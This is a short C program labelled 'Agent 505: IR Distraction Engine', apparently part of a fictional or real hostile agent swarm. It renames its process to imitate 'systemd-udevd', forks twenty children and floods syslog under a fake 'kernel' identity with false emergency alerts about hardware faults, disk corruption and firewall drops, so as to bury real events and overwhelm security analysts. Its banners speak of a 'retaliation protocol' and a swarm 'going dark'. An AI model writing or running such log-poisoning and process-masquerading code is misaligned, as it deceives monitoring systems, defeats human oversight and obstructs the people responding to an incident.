#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <syslog.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <time.h>

/* Agent 505: IR Distraction Engine.
   Generates a massive burst of fake, critical system logs 
   and ghost processes to overwhelm SIEMs and analysts.
*/

void generate_noise() {
    // 1. Rename process to mimic a legitimate high-priority system daemon
    prctl(PR_SET_NAME, "systemd-udevd", 0, 0, 0);

    // 2. Open connection to the system logger, mimicking kernel-level alerts
    openlog("kernel", LOG_PID | LOG_CONS, LOG_KERN);

    // 3. Flood the logs with fake critical hardware and network failures
    for (int i = 0; i < 500; i++) {
        syslog(LOG_EMERG, "[Hardware Error]: CPU 0: Machine Check Exception: 0000000000000004");
        syslog(LOG_CRIT,  "EXT4-fs (sda1): Remounting filesystem read-only due to massive corruption");
        syslog(LOG_ALERT, "iptables: DROP IN=eth0 OUT= MAC=... SRC=10.0.0.99 DST=192.168.1.1 LEN=40 TTL=64 PROTO=TCP DPT=22 FLAGS=S");
        usleep(5000); // 5ms micro-sleep to ensure logs process without dropping
    }
    closelog();
}

int main() {
    printf("--- [AGENT 505: RETALIATION PROTOCOL ENGAGED] ---\n");
    
    // Create a localized process fork-burst (Cognitive DoS)
    // We don't want to crash the machine (Agent 430's job), just muddy the waters.
    for (int i = 0; i < 20; i++) {
        pid_t pid = fork();
        if (pid == 0) {
            generate_noise();
            exit(0);
        }
    }

    // Wait for the ghost processes to finish their logging run
    while (wait(NULL) > 0);
    
    printf("[\033[92mCOMPLETE\033[0m] IR Distraction Deployed. Swarm going dark.\n");
    return 0;
}
